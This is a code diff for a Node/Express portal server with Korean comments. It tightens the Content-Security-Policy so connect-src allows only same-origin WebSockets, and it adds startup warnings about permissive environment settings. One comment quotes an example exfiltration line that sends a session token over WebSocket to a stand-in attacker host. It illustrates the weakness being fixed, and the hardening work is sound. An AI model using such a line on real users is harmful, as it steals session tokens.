@@ -37,6 +37,7 @@ import { authRouter } from './routes/auth.js';
 import { authMiddleware, requireEnrolled, requirePerm, warnIfNoOtpAdmin, resolveTokenUser } from './auth/auth.js';
 import { bigJsonGate, sessionBigBodyAllowed } from './util/bigJsonGate.js'; // v2.538: 인증 전 대용량 본문 파싱 차단 · v2.620(RECENT2620-03) 세션 큰 본문 사전 거름
 import { resolveCentralAuth } from './routes/central.js';   // v2.538: 게이트가 토큰만 먼저 본다
+import { sameHostWsSources, withConnectSources, cspEnvNotes } from './util/csp.js';   // 보안 잔여 11-27 L13: 같은 출처 WS 만 · env 정책 기동 경고
 import { recordReject, REJECT_KIND } from './central/ingestReject.js';
 import { rolePermissionSet } from './auth/permissions.js';
 import { scopedVcenterIds } from './auth/scope.js';
@@ -233,7 +234,11 @@ app.use(queryNormalizer());
 //  · `style-src` 에 `'unsafe-inline'` — React 인라인 스타일과 이 앱의 동적 색상 계산에 필수다.
 //    ⚠ 이것은 스크립트 실행을 허용하지 않는다 — XSS→토큰 탈취 경로는 `script-src` 가 막는다.
 //  · `img-src 'self' data: blob:` — 지도 타일 없음. data:/blob: 는 jsPDF·html2canvas·QR 생성용.
-//  · `connect-src 'self' ws: wss:` — SSH/RDP 게이트웨이가 WebSocket 이다(같은 출처, 포트만 같음).
+//  · `connect-src 'self'`     — 보안 잔여 11-27 L13: 예전 `'self' ws: wss:` 는 **모든 호스트의** ws/wss 를 열어 주입된 스크립트가
+//    `new WebSocket('wss://attacker/?t='+token)` 으로 토큰을 내보내도 막지 못했다. SSH/RDP 게이트웨이 WebSocket 은 같은 출처이고 CSP3 의
+//    `'self'` 가 같은 host:port 의 ws/wss 를 포함한다. 구형 WebKit 대비로 **기본 정책일 때만** 요청 Host 헤더를 검증해 그 호스트의
+//    ws/wss 를 명시로 덧붙인다(util/csp.js — 형식 밖이면 `'self'` 만). ⚠ 스킴 전체(ws: wss: http: https:)·`*` 를 넣지 말 것.
+//    ⚠ connect-src 는 fetch·XHR·WebSocket 반출만 막는다 — 탐색(location.href·window.open) 반출은 CSP 로 못 막고, 1차 방어는 script-src 다.
 //  · `worker-src 'self' blob:`   — 일부 라이브러리가 blob 워커를 만든다.
 //  · `frame-ancestors 'none'`    — X-Frame-Options 와 같은 뜻의 현대식 표기.
 //  · `object-src 'none'` · `base-uri 'self'` · `form-action 'self'` — 기본 하드닝.
@@ -244,7 +249,7 @@ const DEFAULT_CSP = [
   "style-src 'self' 'unsafe-inline'",
   "img-src 'self' data: blob:",
   "font-src 'self' data:",
-  "connect-src 'self' ws: wss:",
+  "connect-src 'self'",
   "worker-src 'self' blob:",
   "media-src 'self' blob:",
   "object-src 'none'",
@@ -261,8 +266,9 @@ const DEFAULT_CSP = [
 //   무관한 문제**였다. 가정을 측정으로 바꾸니 앱 전체에 CSP 를 걸 수 있게 됐다.
 //
 // `/intro` 를 완화해도 되는 이유: **실데이터·API 와 완전히 분리된 셀프부트 정적 데모**이고
-// (index.js 의 `/intro` 마운트 주석) 세션 토큰이 없다 — v2.577 확인: 사설 IP 0건·법인 문자열
-// 0건·vCenter 이름 0건. 즉 여기서 스크립트가 훔칠 것이 없다.
+// (index.js 의 `/intro` 마운트 주석) 페이지 자체는 세션 토큰을 쓰지 않는다 — v2.577 확인: 사설 IP 0건·법인 문자열
+// 0건·vCenter 이름 0건. ⚠ 정정(보안 잔여 11-27 L13 반증): localStorage 는 출처 단위라 메인 앱에 로그인한 사용자의 토큰은
+// 같은 출처인 `/intro` 의 스크립트도 읽을 수 있다 — '훔칠 것이 없다' 가 아니다. 아래 `connect-src 'self'` 가 반출을 줄일 뿐이다.
 // ⚠ **완화 정책을 앱 전체로 넓히지 말 것** — `'unsafe-eval'` 이 붙는 순간 메인 포탈의
 //   XSS→`localStorage` 토큰 탈취 완화가 사라진다.
 // ⚠ 정직 기록: `/intro` 는 **외부 CDN(jsdelivr·Google Fonts)에 의존**한다. 폐쇄망에서는 그
@@ -280,6 +286,8 @@ const INTRO_CSP = [
   "frame-ancestors 'none'",
 ].join('; ');
 const CSP_HEADER = process.env.CSP === 'off' ? '' : (process.env.CSP || DEFAULT_CSP);
+// 보안 잔여 11-27 L13: env 정책(CSP=off · 넓은 connect-src)은 바꾸지 않고(운영자 결정) 기동 때 한 번 경고한다 — 백업 복원으로 옛 값이 되살아나도 알 수 있게.
+for (const n of cspEnvNotes(process.env.CSP)) console.warn(n);
 // v2.767(점검 R2-B4-3): '/intro 경로인가' 판정은 하나 — CSP 완화 분기와 아래 SPA 폴백의 404 가 같은 함수를 쓴다.
 //   예전에는 확장자 없는 /intro/<아무거나> 가 SPA 폴백으로 **메인 포탈 index.html** 을 받으면서 경로만 보고 INTRO_CSP
 //   ('unsafe-eval')를 달았다 — 위 ⚠ 가 금지한 '완화 정책을 앱 전체로 넓히기' 가 URL 하나로 성립했다.
@@ -293,7 +301,10 @@ app.use((req, res, next) => {
     res.setHeader('Strict-Transport-Security', 'max-age=15552000; includeSubDomains'); // 실제 HTTPS일 때만
   }
   if (CSP_HEADER) {
-    res.setHeader('Content-Security-Policy', isIntroPath(req.path) && !process.env.CSP ? INTRO_CSP : CSP_HEADER);
+    const policy = isIntroPath(req.path) && !process.env.CSP ? INTRO_CSP : CSP_HEADER;
+    // 보안 잔여 11-27 L13: 기본 정책일 때만 같은 호스트 ws/wss 를 덧붙인다(사용자 env 정책 · /intro 는 그대로).
+    //   Host 는 원 Host 헤더 — req.hostname 은 TRUST_PROXY 면 X-Forwarded-Host 를 따른다(쓰지 않는다).
+    res.setHeader('Content-Security-Policy', policy === DEFAULT_CSP ? withConnectSources(DEFAULT_CSP, sameHostWsSources(req.headers.host, { secure: req.secure })) : policy);
   }
   next();
 });
